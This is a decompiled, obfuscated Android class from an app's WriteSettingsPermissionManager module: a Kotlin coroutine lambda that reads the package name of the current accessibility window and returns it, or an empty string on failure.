package com.storm.safe.rock.service.modules;

import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$handleAccessibilityEvent$2$currentPkg$1", m214403f = "WriteSettingsPermissionManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* renamed from: com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$handleAccessibilityEvent$2$currentPkg$1 */
/* loaded from: classes2.dex */
final class C0312x64098e5a extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0327b2 f52972a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0312x64098e5a(C0327b2 c0327b2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52972a1 = c0327b2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new C0312x64098e5a(this.f52972a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((C0312x64098e5a) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CharSequence packageName;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            AccessibilityNodeInfo accessibilityNodeInfoM211468g2 = this.f52972a1.f53166a0.m211468g2();
            if (accessibilityNodeInfoM211468g2 != null && (packageName = accessibilityNodeInfoM211468g2.getPackageName()) != null) {
                String string = packageName.toString();
                if (string != null) {
                    return string;
                }
            }
        } catch (Exception unused) {
        }
        return "";
    }
}
